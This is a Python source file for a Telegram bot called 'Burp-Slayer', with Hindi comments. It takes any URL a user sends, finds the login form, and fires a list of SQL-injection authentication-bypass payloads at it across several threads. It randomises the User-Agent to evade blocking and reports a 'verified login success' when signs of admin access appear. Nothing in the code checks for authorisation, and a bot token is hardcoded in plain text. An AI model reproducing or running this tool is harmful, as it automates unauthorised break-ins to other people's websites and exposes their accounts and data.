import telebot
import requests
from bs4 import BeautifulSoup
import time
import random
import urllib.parse
from flask import Flask
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

# Render Keep-Alive
app = Flask('')
@app.route('/')
def home(): return "Burp-Slayer V14.0 (Verified Success) is Online!"
def run(): app.run(host='0.0.0.0', port=10000)
def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

# आपका बोट टोकन
TOKEN = '8391067758:AAGE2NaejHoHVY7rpo6947n0WiTV2Hk41aY'
bot = telebot.TeleBot(TOKEN)

# SQL पेलोड्स
SQL_LIBRARY = [
    "' or 1=1--", "admin' --", "admin' #", "' or 1=1 LIMIT 1--", 
    "admin' OR '1'='1'--", "') OR ('1'='1", "' OR SLEEP(5)--",
    "admin'/*", "' or ''='", "admin\" or 1=1--", "' OR 1=1#"
]

# सफलता की पहचान के लिए कीवर्ड्स
SUCCESS_KEYWORDS = [
    "logout", "log out", "signout", "sign out", "dashboard", 
    "admin panel", "welcome admin", "management", "settings", 
    "profile", "system status", "logged in as"
]

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🎯 **Burp-Slayer V14.0 (Verified Success Mode)**\n\nURL भेजें। अब मैं केवल तभी 'SUCCESS' बोलूँगा जब मुझे पेज पर **Logout, Dashboard या Admin** जैसे पक्के सबूत मिलेंगे।")

@bot.message_handler(func=lambda message: message.text.startswith('http'))
def attack_init(message):
    target_url = message.text
    chat_id = message.chat.id
    status_msg = bot.send_message(chat_id, "📡 टारगेट का विश्लेषण और फॉर्म डिटेक्शन शुरू...")

    session = requests.Session()
    try:
        res = session.get(target_url, timeout=12)
        soup = BeautifulSoup(res.text, 'html.parser')
        form = soup.find('form')
        
        if not form:
            bot.edit_message_text("❌ एरर: इस पेज पर कोई फॉर्म नहीं मिला।", chat_id, status_msg.message_id)
            return

        inputs = form.find_all('input')
        input_names = [i.get('name') for i in inputs if i.get('name')]
        user_key = next((n for n in input_names if any(x in n.lower() for x in ['user', 'login', 'id'])), input_names[0])
        pass_key = next((n for n in input_names if 'pass' in n.lower()), input_names[1] if len(input_names)>1 else 'password')

        bot.edit_message_text(f"🚀 **Verified Intruder Mode Started!**\nTarget: `{target_url}`", chat_id, status_msg.message_id)

        found_info = {"success": False}

        # मल्टी-थ्रेडिंग इंजन (5 थ्रेड्स)
        with ThreadPoolExecutor(max_workers=5) as executor:
            for p in SQL_LIBRARY:
                if found_info["success"]: break
                executor.submit(verification_engine, target_url, user_key, pass_key, p, chat_id, found_info)
                time.sleep(0.4)

        if not found_info["success"]:
            bot.send_message(chat_id, "ℹ️ लाइब्रेरी खत्म। कोई सत्यापित (Verified) सफलता नहीं मिली।")

    except Exception as e:
        bot.send_message(chat_id, f"⚠️ एरर: {str(e)}")

def verification_engine(url, u_key, p_key, p, chat_id, found_info):
    if found_info["success"]: return
    
    # पेलोड म्यूटेशन
    variants = [p, urllib.parse.quote(p)]
    
    for variant in variants:
        try:
            # हर बार अलग यूजर एजेंट ताकि ब्लॉक न हो
            headers = {'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.random()}"}
            data = {u_key: variant, p_key: variant}
            
            # रिक्वेस्ट भेजना (रीडायरेक्ट को फॉलो करना जरूरी है)
            r = requests.post(url, data=data, headers=headers, timeout=15, allow_redirects=True)
            
            response_content = r.text.lower()
            current_url = r.url.lower()

            # --- VERIFICATION LOGIC ---
            # 1. क्या पेज के कंटेंट में सफलता वाले शब्द हैं?
            has_keyword = any(word in response_content for word in SUCCESS_KEYWORDS)
            
            # 2. क्या URL बदलकर /admin या /dashboard जैसा कुछ हो गया?
            has_admin_url = any(x in current_url for x in ["admin", "dashboard", "home", "main", "panel"])

            if has_keyword or (has_admin_url and r.url != url):
                found_info["success"] = True
                bot.send_message(chat_id, f"🔥 **VERIFIED LOGIN SUCCESS!** 🔥\n\n✅ **SQL Payload:** `{variant}`\n✅ **Verified By:** {'Keywords' if has_keyword else 'URL Redirect'}\n🔗 **Redirected To:** {r.url}\n\nबधाई हो! यह पेलोड काम कर रहा है।")
                return
        except:
            pass

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
